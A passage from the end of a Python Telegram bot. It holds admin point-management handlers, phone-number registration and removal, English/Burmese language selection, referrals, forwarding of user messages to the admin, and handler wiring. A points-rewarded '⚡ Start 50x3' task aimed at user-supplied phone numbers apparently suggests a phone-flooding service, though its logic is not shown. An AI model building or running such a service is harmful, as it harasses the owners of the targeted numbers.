            msg = TEXTS[lang]['no_users']
        else:
            users_text = "\n".join([f"ID: `{row[0]}` | {row[1]} | {row[2]} pts" for row in rows])
            msg = TEXTS[lang]['admin_list'].format(users=users_text)
        await query.edit_message_text(msg, parse_mode="Markdown")
    elif data == "admin_close":
        await query.edit_message_text("Admin panel closed.", reply_markup=main_keyboard(user_id))
    else:
        await query.edit_message_text("Unknown action.")

async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    action = context.user_data.get("admin_action")
    if not action:
        return
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    lang = get_user_language(user_id)
    text = update.message.text.strip()
    parts = text.split()
    if len(parts) != 2:
        await update.message.reply_text("Invalid format. Send: `user_id points`", parse_mode="Markdown")
        return
    try:
        target_id = int(parts[0])
        points = int(parts[1])
    except:
        await update.message.reply_text("Invalid numbers.")
        return
    if action == "add":
        update_points(target_id, points)
        await update.message.reply_text(TEXTS[lang]['admin_done'].format(action="Added", points=points, target=target_id))
    elif action == "remove":
        update_points(target_id, -points)
        await update.message.reply_text(TEXTS[lang]['admin_done'].format(action="Removed", points=points, target=target_id))
    elif action == "set":
        set_points(target_id, points)
        await update.message.reply_text(TEXTS[lang]['admin_done'].format(action="Set", points=points, target=target_id))
    context.user_data["admin_action"] = None
    await update.message.reply_text("Admin action completed.", reply_markup=main_keyboard(user_id))

async def remove_phone_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /removephone <index>\nExample: /removephone 1")
        return
    try:
        index = int(context.args[0])
    except:
        await update.message.reply_text("Please provide a number (index).")
        return
    success, msg = remove_user_phone(user_id, index)
    if success:
        await forward_to_admin(context, user_id, f"Removed phone number index {index}")
    await update.message.reply_text(msg)

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_registered(user_id):
        await start(update, context)
        return
    await update.message.reply_text(
        "Choose your language / သင့်ဘာသာစကားကို ရွေးချယ်ပါ:",
        reply_markup=language_keyboard()
    )
    return WAITING_LANGUAGE

async def set_language_after_registration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "lang_en":
        lang = 'en'
    elif data == "lang_my":
        lang = 'my'
    else:
        return
    user_id = update.effective_user.id
    set_user_language(user_id, lang)
    await query.edit_message_text(f"✅ Language set to {lang.upper()}.", reply_markup=main_keyboard(user_id))

async def fallback_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Forward any unhandled text message to admin."""
    if update.message and update.message.text:
        user_id = update.effective_user.id
        text = update.message.text
        # Ignore if it's a command or handled by other handlers
        if text.startswith('/'):
            return
        # Forward to admin
        await forward_to_admin(context, user_id, text)
        # Reply to user in their language
        if is_registered(user_id):
            lang = get_user_language(user_id)
            await update.message.reply_text(TEXTS[lang]['forwarded_to_admin'])
        else:
            await update.message.reply_text("Your message has been forwarded to the admin. Please /start to register.")

# ------------------ Main ------------------
def main():
    # Get bot username once
    global BOT_USERNAME
    try:
        import requests
        resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe")
        if resp.status_code == 200:
            BOT_USERNAME = resp.json()['result']['username']
        else:
            BOT_USERNAME = "your_bot_username"
    except:
        BOT_USERNAME = "your_bot_username"

    app = Application.builder().token(BOT_TOKEN).build()

    # Language selection conversation (for new users)
    lang_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(language_selection, pattern="^lang_")],
        states={},
        fallbacks=[],
        allow_reentry=True
    )
    # Language change after registration
    app.add_handler(CallbackQueryHandler(set_language_after_registration, pattern="^lang_"), group=2)

    # Phone selection conversation
    phone_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex(r"^⚡ Start 50x3"), start_50x3)],
        states={WAITING_PHONE_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_selection)]},
        fallbacks=[CommandHandler("cancel", stop_task)],
        allow_reentry=True
    )

    # Add phone via contact conversation
    add_contact_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex(r"^➕ Add Phone via Contact|➕ ဖုန်းနံပါတ်ထည့်ရန်"), add_phone_contact_button)],
        states={WAITING_CONTACT_ADD: [MessageHandler(filters.CONTACT, contact_handler),
                                      MessageHandler(filters.Regex(r"^❌ Cancel$"), cancel_addition)]},
        fallbacks=[CommandHandler("cancel", cancel_addition)],
        allow_reentry=True
    )

    # Start conversation (for new users)
    start_conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={WAITING_LANGUAGE: [CallbackQueryHandler(language_selection, pattern="^lang_")]},
        fallbacks=[],
        allow_reentry=True
    )

    # Admin text input
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_text_input), group=1)

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("language", language_command))
    app.add_handler(CommandHandler("stop_task", stop_task))
    app.add_handler(CommandHandler("removephone", remove_phone_command))
    app.add_handler(CommandHandler("myphones", my_phones))
    app.add_handler(CommandHandler("points", my_points))
    app.add_handler(CommandHandler("referral", referral_link))
    app.add_handler(CommandHandler("help", help_command))

    # Button handlers
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    app.add_handler(MessageHandler(filters.Regex(r"^⚡ Start 50x3"), start_50x3))
    app.add_handler(MessageHandler(filters.Regex(r"^📞 My Phones|📞 ကျွန်ုပ်၏ဖုန်းများ"), my_phones))
    app.add_handler(MessageHandler(filters.Regex(r"^➕ Add Phone via Contact|➕ ဖုန်းနံပါတ်ထည့်ရန်"), add_phone_contact_button))
    app.add_handler(MessageHandler(filters.Regex(r"^🔗 Referral Link|🔗 ရည်ညွှန်းလင့်"), referral_link))
    app.add_handler(MessageHandler(filters.Regex(r"^💰 My Points|💰 ကျွန်ုပ်၏ပွိုင့်များ"), my_points))
    app.add_handler(MessageHandler(filters.Regex(r"^❓ Help|❓ အကူညီ"), help_command))
    app.add_handler(MessageHandler(filters.Regex(r"^🛑 Stop Task|🛑 လုပ်ဆောင်ချက်ရပ်ရန်"), stop_task))
    app.add_handler(MessageHandler(filters.Regex(r"^👑 Admin Panel|👑 အက်ဒမင် ဘောင်း"), admin_panel))

    # Typed phone number handler (must be after button handlers)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, typed_phone_number))

    # Fallback for any other text (forward to admin)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fallback_message_handler), group=3)

    app.add_handler(start_conv)
    app.add_handler(phone_conv)
    app.add_handler(add_contact_conv)
    app.add_handler(lang_conv)
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))

    logger.info("Bot started with bilingual support, 7 phones, typed number addition, full forwarding to admin.")
    app.run_polling()

if __name__ == "__main__":
    main()